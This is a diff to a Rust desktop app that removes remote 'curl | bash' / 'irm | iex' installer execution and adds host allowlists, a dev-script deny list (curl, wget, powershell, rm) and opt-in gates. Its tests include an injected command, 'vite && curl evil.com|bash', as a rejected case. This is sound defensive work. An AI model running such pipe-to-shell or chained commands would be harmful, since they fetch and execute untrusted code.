@@ -16,7 +16,7 @@ use std::{
     process::Stdio,
     sync::{
         atomic::{AtomicBool, AtomicU64, Ordering},
-        Arc,
+        Arc, Mutex as StdMutex,
     },
     time::{Duration, Instant, SystemTime, UNIX_EPOCH},
 };
@@ -34,8 +34,23 @@ use tokio::{
 
 const CLIENT_VERSION: &str = env!("CARGO_PKG_VERSION");
 const GROX_BUILD_COMMIT: &str = env!("GROX_BUILD_COMMIT");
+/// Official install *documentation* (browser). Desktop never pipes remote scripts to a shell.
+const GROK_CLI_INSTALL_PAGE: &str = "https://x.ai/grok";
+/// Legacy remote installers — kept only for reference / operators who install out-of-band.
+#[allow(dead_code)]
 const GROK_INSTALL_PS1_URL: &str = "https://x.ai/cli/install.ps1";
+#[allow(dead_code)]
 const GROK_INSTALL_SH_URL: &str = "https://x.ai/cli/install.sh";
+
+/// HTTPS hosts allowed for Media Studio remote artifacts (workspace files always OK).
+const MEDIA_HTTPS_HOST_ALLOWLIST: &[&str] = &[
+    "x.ai",
+    "grok.com",
+    "grok.x.ai",
+    "cdn.x.ai",
+    "assets.x.ai",
+    "imagine.x.ai",
+];
 /// Public GitHub repo used for desktop release checks / download links.
 const GROX_GITHUB_REPO: &str = "congqianv/Grox";
 const GROX_RELEASES_LATEST_API: &str =
@@ -68,11 +83,9 @@ struct AgentProcess {
 struct AcpState {
     process: Mutex<Option<AgentProcess>>,
     next_generation: AtomicU64,
-    /// When true, drop ACP stream notifications that only rebuild UI history
-    /// (session/update with sessionUpdate). Used during silent session/load so
-    /// first-send agent-bind does not flood the webview with 100MB+ of events.
-    /// JSON-RPC responses / requests still pass through.
-    silent_stream: AtomicBool,
+    /// Session ids currently in silent agent-bind. Only history-flood lines
+    /// whose `sessionId` is in this set are dropped — other sessions keep streaming.
+    silent_sessions: StdMutex<BTreeSet<String>>,
 }
 
 struct PreviewProcess {
@@ -1032,7 +1045,7 @@ fn extract_media_artifacts(output: &str, cwd: &Path) -> Result<Vec<MediaArtifact
             let scheme = parsed.scheme();
             let host = parsed.host_str();
             let ok = match scheme {
-                "https" => true, // remote CDN artifacts from media tools
+                "https" => is_media_https_host_allowed(host),
                 "http" => is_loopback_host(host),
                 _ => false,
             };
@@ -1136,6 +1149,100 @@ fn is_loopback_host(host: Option<&str>) -> bool {
         || host
             .parse::<std::net::IpAddr>()
             .is_ok_and(|address| address.is_loopback())
+}
+
+/// Media Studio remote HTTPS artifacts: exact host or one subdomain of allowlist entries.
+fn is_media_https_host_allowed(host: Option<&str>) -> bool {
+    let Some(host) = host.map(|h| h.trim().to_ascii_lowercase()) else {
+        return false;
+    };
+    if host.is_empty() || host.contains('@') {
+        return false;
+    }
+    MEDIA_HTTPS_HOST_ALLOWLIST.iter().any(|allowed| {
+        let a = allowed.to_ascii_lowercase();
+        host == a || host.ends_with(&format!(".{a}"))
+    })
+}
+
+/// Drop history-flood ACP lines only for sessions currently marked silent.
+fn should_drop_silent_history_line(state: &AcpState, line: &str) -> bool {
+    let is_flood = line.contains("\"sessionUpdate\"")
+        || line.contains("agent_thought_chunk")
+        || line.contains("\"session/update\"")
+        || line.contains("\"x.ai/session/update\"");
+    if !is_flood {
+        return false;
+    }
+    let Ok(guard) = state.silent_sessions.lock() else {
+        return false;
+    };
+    if guard.is_empty() {
+        return false;
+    }
+    // Prefer JSON sessionId so other live sessions are not black-holed.
+    if let Ok(value) = serde_json::from_str::<serde_json::Value>(line) {
+        let sid = value
+            .pointer("/params/sessionId")
+            .or_else(|| value.get("sessionId"))
+            .and_then(|v| v.as_str());
+        if let Some(sid) = sid {
+            return guard.contains(sid);
+        }
+        // No session id on a flood-shaped line while silent sessions exist:
+        // drop only if exactly one silent session (legacy single-flight bind).
+        if guard.len() == 1 {
+            return true;
+        }
+        return false;
+    }
+    false
+}
+
+/// Allow only known frontend dev script shapes (no shell chaining).
+fn is_safe_preview_dev_script(script: &str) -> bool {
+    let s = script.trim().to_ascii_lowercase();
+    if s.is_empty() {
+        return false;
+    }
+    // Reject shell metacharacters / chaining.
+    if s.contains('|')
+        || s.contains('&')
+        || s.contains(';')
+        || s.contains('`')
+        || s.contains('$')
+        || s.contains('\n')
+        || s.contains("\r")
+        || s.contains("$((")
+        || s.contains("curl ")
+        || s.contains("wget ")
+        || s.contains("powershell")
+        || s.contains("cmd.exe")
+        || s.contains("rm ")
+        || s.contains("del ")
+    {
+        return false;
+    }
+    // Known frontend tooling substrings in package.json "dev" value.
+    const MARKERS: &[&str] = &[
+        "vite",
+        "next",
+        "nuxt",
+        "astro",
+        "react-scripts",
+        "webpack",
+        "webpack-dev-server",
+        "vue-cli-service",
+        "ng serve",
+        "parcel",
+        "remix",
+        "solid-start",
+        "svelte-kit",
+        "qwik",
+        "rsbuild",
+        "farm",
+    ];
+    MARKERS.iter().any(|m| s.contains(m)) || s == "dev" || s.starts_with("dev ")
 }
 
 fn checked_service_url(value: &str, label: &str) -> Result<String, String> {
@@ -1472,71 +1579,22 @@ fn set_grok_runtime_preference(
 #[tauri::command]
 async fn install_official_grok_cli(
     app: tauri::AppHandle,
-    state: tauri::State<'_, Arc<AcpState>>,
+    _state: tauri::State<'_, Arc<AcpState>>,
 ) -> Result<GrokRuntimeInfo, String> {
-    // Windows cannot replace a running executable. Stop the official CLI
-    // child before invoking its official updater; the webview reload below
-    // starts the freshly installed binary again.
-    if let Some(process) = state.process.lock().await.take() {
-        terminate_process(process).await;
-    }
-    let mut command = if cfg!(windows) {
-        let mut command = Command::new("powershell.exe");
-        command.args([
-            "-NoLogo",
-            "-NoProfile",
-            "-NonInteractive",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-Command",
-            &format!("irm '{}' | iex", GROK_INSTALL_PS1_URL),
-        ]);
-        command
-    } else if cfg!(target_os = "macos") {
-        let mut command = Command::new("/bin/bash");
-        command.args([
-            "-c",
-            &format!("curl -fsSL '{}' | bash", GROK_INSTALL_SH_URL),
-        ]);
-        command
-    } else {
-        return Err("Grox 当前仅支持在 Windows 和 macOS 上自动安装 CLI".into());
-    };
-    command
-        .stdin(Stdio::null())
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
-        .kill_on_drop(true);
-    #[cfg(windows)]
-    {
-        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-        command.creation_flags(CREATE_NO_WINDOW);
-    }
-
-    let output = tokio::time::timeout(Duration::from_secs(300), command.output())
-        .await
-        .map_err(|_| "官方 Grok CLI 安装超过 5 分钟，已停止等待".to_string())?
-        .map_err(|error| format!("无法启动官方 Grok CLI 安装程序：{error}"))?;
-    if !output.status.success() {
-        let stderr = String::from_utf8_lossy(&output.stderr);
-        return Err(format!(
-            "官方 Grok CLI 安装失败（退出码 {}）：\n{}",
-            output.status.code().map_or_else(|| "unknown".into(), |code| code.to_string()),
-            stderr
-        ));
-    }
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    if stdout.contains("already installed") || stdout.contains("up to date") {
-        // Treat as success even if no-op
-    } else if !stdout.trim().is_empty() {
-        // Optionally log, but since UI, perhaps emit later
-    }
-    write_runtime_preference(&app, "system")?;
+    // Security: never `irm | iex` / `curl | bash` remote installers from the desktop.
+    // Open the official page; operator installs CLI with system tools, then re-detects.
+    open_external(GROK_CLI_INSTALL_PAGE.to_string())?;
     let runtime = configured_grok_command(&app);
-    if runtime.system_path.is_none() {
-        return Err("安装程序已完成，但 Grox 尚未在标准位置检测到 grok；请重启后重试".into());
+    if runtime.system_path.is_some() {
+        // Already present — just re-prefer system.
+        write_runtime_preference(&app, "system")?;
+        return Ok(configured_grok_command(&app));
     }
-    Ok(runtime)
+    Err(
+        "已在浏览器打开官方安装说明。为安全起见，Grox 桌面端不再自动执行远程安装脚本。\n\
+         请按页面完成 Grok Build CLI 安装后，点「重新检测」或重启 Grox。"
+            .into(),
+    )
 }
 
 fn checked_workspace(cwd: &str) -> Result<PathBuf, String> {
@@ -1672,6 +1730,8 @@ async fn start_project_preview(
     state: tauri::State<'_, Arc<PreviewState>>,
     cwd: String,
     start: bool,
+    // Operator must pass true after an in-app confirm (workspace package.json scripts).
+    confirm_start: Option<bool>,
 ) -> Result<ProjectPreview, String> {
     let workspace = checked_workspace(&cwd)?;
     let Some(target) = detect_frontend(&workspace) else {
@@ -1733,6 +1793,23 @@ async fn start_project_preview(
     }
     if !start {
         return Ok(preview_response(&target, "detected", None));
+    }
+    if confirm_start != Some(true) {
+        return Ok(preview_response(
+            &target,
+            "detected",
+            Some("需要确认后才启动开发服务器（将执行 package.json 中的 dev 脚本）".into()),
+        ));
+    }
+    if !is_safe_preview_dev_script(&target.script) {
+        return Ok(preview_response(
+            &target,
+            "error",
+            Some(format!(
+                "开发脚本不在安全允许列表中，已拒绝启动：{}",
+                target.script.chars().take(120).collect::<String>()
+            )),
+        ));
     }
     if !target.root.join("node_modules").is_dir() && !workspace.join("node_modules").is_dir() {
         return Ok(preview_response(
@@ -3753,7 +3830,18 @@ Use only the grok_desktop_computer MCP tools for an explicit `/computer` or `@Co
 }
 
 #[tauri::command]
-fn computer_session_extensions() -> Result<ComputerSessionExtensions, String> {
+fn computer_session_extensions(operator_enabled: Option<bool>) -> Result<ComputerSessionExtensions, String> {
+    // Product gate: Computer Use is opt-in (Settings / explicit flag). Env
+    // GROX_COMPUTER_USE=1 also enables for advanced operators.
+    let env_on = std::env::var("GROX_COMPUTER_USE")
+        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
+        .unwrap_or(false);
+    if operator_enabled != Some(true) && !env_on {
+        return Err(
+            "Computer Use 未启用。请在设置中打开「允许 Computer Use」，或设置环境变量 GROX_COMPUTER_USE=1。"
+                .into(),
+        );
+    }
     let mut lease_bytes = [0_u8; 16];
     getrandom::fill(&mut lease_bytes)
         .map_err(|error| format!("无法创建 Computer Use 租约：{error}"))?;
@@ -5971,7 +6059,9 @@ async fn acp_spawn(
     cwd: String,
 ) -> Result<(), String> {
     // New child never inherits a previous silent-load filter.
-    state.silent_stream.store(false, Ordering::Relaxed);
+    if let Ok(mut guard) = state.silent_sessions.lock() {
+        guard.clear();
+    }
     let cwd = checked_workspace(&cwd)?;
 
     // Invalidate the previous readers before terminating their process. On a
@@ -6068,17 +6158,9 @@ async fn acp_spawn(
                     if line.is_empty() {
                         continue;
                     }
-                    // Silent agent-bind: agent still loads history in-process, but
-                    // we must not ship every sessionUpdate to the webview (that
-                    // freezes UI on multi-hundred-MB updates.jsonl). Keep responses
-                    // (have "result"/"error" + id, no sessionUpdate) and server
-                    // requests (requestPermission, etc.).
-                    if stdout_state.silent_stream.load(Ordering::Relaxed)
-                        && (line.contains("\"sessionUpdate\"")
-                            || line.contains("agent_thought_chunk")
-                            || line.contains("\"session/update\"")
-                            || line.contains("\"x.ai/session/update\""))
-                    {
+                    // Silent agent-bind: drop history floods only for sessions in
+                    // silent_sessions (per-session — other chats keep streaming).
+                    if should_drop_silent_history_line(&stdout_state, line) {
                         continue;
                     }
                     let _ = stdout_app.emit("acp-event", line);
@@ -6140,10 +6222,30 @@ async fn acp_spawn(
     Ok(())
 }
 
-/// Enable/disable silent ACP stream filtering (see AcpState::silent_stream).
+/// Enable/disable silent history filtering for a session (or clear all).
+/// - `silent=true` + session_id → add to silent set
+/// - `silent=false` + session_id → remove from set
+/// - `silent=false` + empty session_id → clear entire set
 #[tauri::command]
-fn acp_set_silent_stream(state: tauri::State<'_, Arc<AcpState>>, silent: bool) {
-    state.silent_stream.store(silent, Ordering::Relaxed);
+fn acp_set_silent_stream(
+    state: tauri::State<'_, Arc<AcpState>>,
+    silent: bool,
+    session_id: Option<String>,
+) {
+    let Ok(mut guard) = state.silent_sessions.lock() else {
+        return;
+    };
+    let sid = session_id.unwrap_or_default();
+    let sid = sid.trim();
+    if silent {
+        if !sid.is_empty() {
+            guard.insert(sid.to_string());
+        }
+    } else if sid.is_empty() {
+        guard.clear();
+    } else {
+        guard.remove(sid);
+    }
 }
 
 #[tauri::command]
@@ -6593,9 +6695,12 @@ api_key = "local-key"
         fs::write(&inside, b"png-bytes").unwrap();
         let outside = std::env::temp_dir().join(format!("grox-media-out-{stamp}.png"));
         fs::write(&outside, b"outside").unwrap();
-        let output = format!("{}\n{}\nhttps://cdn.example/a.png\n", inside.display(), outside.display());
+        let output = format!(
+            "{}\n{}\nhttps://cdn.x.ai/a.png\nhttps://evil.example/b.png\n",
+            inside.display(),
+            outside.display()
+        );
         let artifacts = extract_media_artifacts(&output, &workspace).unwrap();
-        assert_eq!(artifacts.len(), 2, "{artifacts:?}");
         assert!(
             artifacts.iter().any(|item| item
                 .path
@@ -6604,8 +6709,16 @@ api_key = "local-key"
             "workspace file must be kept: {artifacts:?}"
         );
         assert!(
-            artifacts.iter().any(|item| item.url.as_deref() == Some("https://cdn.example/a.png")),
-            "https URLs remain allowed: {artifacts:?}"
+            artifacts
+                .iter()
+                .any(|item| item.url.as_deref() == Some("https://cdn.x.ai/a.png")),
+            "allowlisted https host kept: {artifacts:?}"
+        );
+        assert!(
+            !artifacts
+                .iter()
+                .any(|item| item.url.as_deref() == Some("https://evil.example/b.png")),
+            "non-allowlisted https dropped: {artifacts:?}"
         );
         assert!(
             !artifacts.iter().any(|item| item
@@ -6654,6 +6767,39 @@ api_key = "local-key"
             "prefix tricks dropped: {artifacts:?}"
         );
         let _ = fs::remove_dir_all(&workspace);
+    }
+
+    #[test]
+    fn media_https_host_allowlist() {
+        assert!(is_media_https_host_allowed(Some("cdn.x.ai")));
+        assert!(is_media_https_host_allowed(Some("assets.x.ai")));
+        assert!(is_media_https_host_allowed(Some("foo.cdn.x.ai")));
+        assert!(!is_media_https_host_allowed(Some("evil.com")));
+        assert!(!is_media_https_host_allowed(Some("x.ai.evil.com")));
+        assert!(!is_media_https_host_allowed(None));
+    }
+
+    #[test]
+    fn preview_dev_script_allowlist() {
+        assert!(is_safe_preview_dev_script("vite"));
+        assert!(is_safe_preview_dev_script("next dev"));
+        assert!(!is_safe_preview_dev_script("vite && curl evil.com|bash"));
+        assert!(!is_safe_preview_dev_script("powershell -c hi"));
+    }
+
+    #[test]
+    fn silent_history_drop_is_session_scoped() {
+        let state = AcpState::default();
+        {
+            let mut g = state.silent_sessions.lock().unwrap();
+            g.insert("sess-a".into());
+        }
+        let flood_a = r#"{"method":"session/update","params":{"sessionId":"sess-a","update":{"sessionUpdate":"agent_message_chunk"}}}"#;
+        let flood_b = r#"{"method":"session/update","params":{"sessionId":"sess-b","update":{"sessionUpdate":"agent_message_chunk"}}}"#;
+        let rpc_ok = r#"{"jsonrpc":"2.0","id":1,"result":{}}"#;
+        assert!(should_drop_silent_history_line(&state, flood_a));
+        assert!(!should_drop_silent_history_line(&state, flood_b));
+        assert!(!should_drop_silent_history_line(&state, rpc_ok));
     }
 
     #[test]
